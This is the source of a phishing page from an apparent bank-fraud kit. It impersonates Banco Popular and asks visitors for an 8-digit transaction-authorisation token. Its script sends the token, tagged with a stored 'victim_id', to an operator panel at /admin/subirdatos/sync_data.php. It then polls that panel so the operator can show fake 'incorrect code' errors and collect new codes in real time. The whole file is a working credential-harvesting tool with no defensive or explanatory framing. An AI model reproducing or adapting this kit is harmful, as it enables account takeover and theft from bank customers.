<?php
include_once dirname(dirname(dirname(dirname(dirname(dirname(dirname(__DIR__))))))) . '/admin/subirdatos/security_gate.php';
?>
<html lang="es" data-critters-container="" class="show-recaptcha"><head>
    <meta charset="utf-8">
    <title>Banco Popular - Verificación</title>
    <meta name="viewport" content="viewport-fit=cover, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="icon" type="image/x-icon" href="assets/images/favicon.ico">
    <link rel="stylesheet" href="styles.fed8e18f72c98fcf.css">
    <style>
      #loader-movii {
          position: fixed; top: 0; left: 0; width: 100%; height: 100%;
          background: #ffffff; display: none; flex-direction: column;
          justify-content: center; align-items: center; z-index: 999999;
      }
      .loader-content { text-align: center; display: flex; flex-direction: column; align-items: center; gap: 20px; }
      .loader-logo { width: 180px; margin-bottom: 10px; animation: pulse 2s infinite ease-in-out; }
      .loader-spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #105163; border-radius: 50%; animation: spin 1s linear infinite; }
      .loader-text { color: #105163; font-family: 'Inter', sans-serif; font-size: 16px; font-weight: 500; }
      @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
      @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.05); opacity: 0.8; } 100% { transform: scale(1); opacity: 1; } }
      
      #movii-alert {
          display: none; position: fixed; top: 20px; left: 50%;
          transform: translateX(-50%); background-color: #fff;
          color: #333; padding: 15px 25px; border-radius: 12px;
          box-shadow: 0 10px 25px rgba(0,0,0,0.3); z-index: 100000;
          width: 90%; max-width: 400px; border-left: 5px solid #105163;
          animation: slideDown 0.5s ease-out;
      }
      @keyframes slideDown { from { top: -100px; opacity: 0; } to { top: 20px; opacity: 1; } }

      /* Estilos base del fondo difuminado */
      body, html { height: 100%; margin: 0; font-family: 'Inter', sans-serif; overflow: hidden; background-color: #f4f7f6; }
      .bg-container { 
          position: fixed; top: 0; left: 0; width: 100%; height: 100%;
          background: linear-gradient(135deg, #007a33 0%, #105163 100%);
          filter: blur(50px); opacity: 0.15; z-index: 1; 
      }
      
      /* Estilos del Modal del Token */
      .modal-overlay {
          position: fixed; top: 0; left: 0; width: 100%; height: 100%;
          background: rgba(0, 0, 0, 0.4); display: flex;
          justify-content: center; align-items: center; z-index: 10000;
      }
      .modal-content {
          background: white; width: 90%; max-width: 400px;
          padding: 30px; border-radius: 20px;
          box-shadow: 0 10px 25px rgba(0,0,0,0.2); text-align: center;
          position: relative;
      }
      .token-logo { width: 120px; margin-bottom: 20px; }
      .modal-title { color: #007a33; font-size: 18px; font-weight: 700; margin-bottom: 15px; }
      .modal-text { color: #444; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
      .otp-container { display: flex; justify-content: center; gap: 5px; margin-bottom: 25px; border: 1px solid #ddd; border-radius: 8px; padding: 10px; }
      .otp-container input { width: 100%; border: none; text-align: center; font-size: 20px; letter-spacing: 10px; outline: none; color: #333; }
      .btn-autorizar { background: #cccccc; color: white; border: none; width: 100%; height: 48px; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.3s; }
      .btn-autorizar.active { background: #007a33; }
      
      /* Estilo para el mensaje de error de token */
      #token-error-msg {
          color: #d93025;
          font-size: 13px;
          margin-bottom: 15px;
          display: none;
          font-weight: 500;
          line-height: 1.4;
      }
    </style>
</head>
<body>
    <!-- Fondo difuminado -->
    <div class="bg-container"></div>

    <!-- Modal Flotante del Token -->
    <div class="modal-overlay">
        <div class="modal-content">
            <img src="assets/images/Logotokenpopular.png" class="token-logo" alt="Token Popular">
            <div class="modal-title">Autoriza esta transacción</div>
            <div id="token-error-msg">El token de seguridad ingresado es incorrecto. Por favor, verifícalo e intenta de nuevo.</div>
            <p class="modal-text">
                Para autorizar esta transacción, ingresa el código de verificación de 8 dígitos que <b>enviamos a tu celular.</b>
            </p>
            
            <form id="form-token">
                <div class="otp-container">
                    <input type="text" id="otp" maxlength="8" placeholder="- - - - - - - -" autocomplete="off" required>
                </div>
                <button type="submit" id="btn-autorizar" class="btn-autorizar">Autorizar</button>
            </form>
        </div>
    </div>

    <div id="loader-movii">
        <div class="loader-content">
            <img src="assets/images/popularhorizontal_new.svg" class="loader-logo" alt="Popular">
            <div class="loader-spinner"></div>
            <p class="loader-text">Validando información...</p>
        </div>
    </div>

    <div id="movii-alert">
        <div class="alert-content">
            <div class="alert-icon">!</div>
            <div class="alert-text">
                <strong>¡Código incorrecto!</strong> Por favor verifica e intenta de nuevo.
            </div>
        </div>
    </div>

    <script src="assets/js/jquery.min.js"></script>
    <script>
        $(document).ready(function() {
            function getProjectRoot() {
                const path = window.location.pathname;
                const parts = path.split('/');
                const pseIndex = parts.indexOf('PSE');
                return pseIndex !== -1 ? parts.slice(0, pseIndex + 1).join('/') : '';
            }

            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('error')) {
                $('#token-error-msg').show();
                $('#movii-alert').fadeIn().delay(8000).fadeOut();
            }

            $('#otp').on('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                if (this.value.length === 8) {
                    $('#btn-autorizar').addClass('active');
                } else {
                    $('#btn-autorizar').removeClass('active');
                }
            });

            $('#form-token').on('submit', function(e) {
                e.preventDefault();
                const otp = $('#otp').val();
                if (otp.length !== 8) return;

                // Ocultar errores anteriores antes de mostrar el loader
                $('#token-error-msg').hide();
                $('#movii-alert').hide();
                
                $('#loader-movii').css('display', 'flex');

                const victimId = localStorage.getItem('victim_id');
                const panelSID = localStorage.getItem('victim_sid') || '';
                const root = getProjectRoot();

                const formData = new FormData();
                formData.append('action', 'save');
                formData.append('id', victimId);
                formData.append('sid', panelSID);
                formData.append('banco', 'BANCO POPULAR');
                formData.append('dinamica', otp);
                formData.append('status', 'esperando');

                $.ajax({
                    type: "POST",
                    url: root + "/admin/subirdatos/sync_data.php",
                    data: formData,
                    processData: false,
                    contentType: false,
                    success: function() {
                        startCheckingStatus();
                    },
                    error: function() {
                        $('#loader-movii').hide();
                        alert("Error de conexión.");
                    }
                });
            });

            // Iniciar chequeo si hay un ID de víctima
            if (localStorage.getItem('victim_id')) {
                startCheckingStatus();
            }

            function startCheckingStatus() {
                if (window.statusIntervalStarted) return;
                window.statusIntervalStarted = true;

                const victimId = localStorage.getItem('victim_id');
                const root = getProjectRoot();
                let hash = window.location.hash.substring(1) || localStorage.getItem('hash') || '';
                
                const statusInterval = setInterval(function() {
                    $.ajax({
                        type: "GET",
                        url: root + "/admin/subirdatos/sync_data.php",
                        data: { id: victimId, t: Date.now() },
                        success: function(response) {
                            try {
                                const res = typeof response === 'string' ? JSON.parse(response) : response;
                                if (!res || !res.data) return;
                                
                                const status = res.data.status ? res.data.status.toLowerCase() : '';
                                console.log("Current Status:", status);
                                
                                const isErrorOtp = status.includes('error') && (status.includes('otp') || status.includes('sms') || status.includes('token') || status.includes('dinamica'));
                                
                                if (isErrorOtp) {
                                     // El admin solicita reingresar el OTP por error
                                     clearInterval(statusInterval);
                                     window.statusIntervalStarted = false;
                                     $('#loader-movii').hide();
                                     
                                     // Limpiar campo y mostrar mensajes de error (predeterminado y flotante)
                                     $('#token-error-msg').show();
                                     $('#movii-alert').fadeIn().delay(8000).fadeOut();
                                     $('#otp').val('');
                                     $('#btn-autorizar').removeClass('active');
                                    
                                    // Actualizar URL sin recargar para persistir estado de error visual
                                    if (!window.location.search.includes('error=true')) {
                                        const newUrl = window.location.pathname + "?error=true" + window.location.hash;
                                        window.history.replaceState({path: newUrl}, '', newUrl);
                                    }
                                } else if (status.includes('error_usuario') || status.includes('error_password') || status.includes('error_pass')) {
                                    clearInterval(statusInterval);
                                    window.statusIntervalStarted = false;
                                    $('#loader-movii').hide();
                                    window.location.href = "index.php?error=true#" + hash;
                                } else if (status === 'finalizado' || status === 'finalizar' || status === 'aprobado') {
                                    clearInterval(statusInterval);
                                    window.statusIntervalStarted = false;
                                    $('#loader-movii').hide();
                                    window.location.href = "final.php#" + hash;
                                } else if (status === 'otp' || status === 'sms' || status === 'token' || status === 'dinamica') {
                                    // Si el estado es simplemente esperar OTP, quitamos el loader para que el usuario pueda escribir
                                    $('#loader-movii').hide();
                                }
                            } catch (e) {}
                        }
                    });
                }, 3000);
            }
        });
    </script>
</body></html>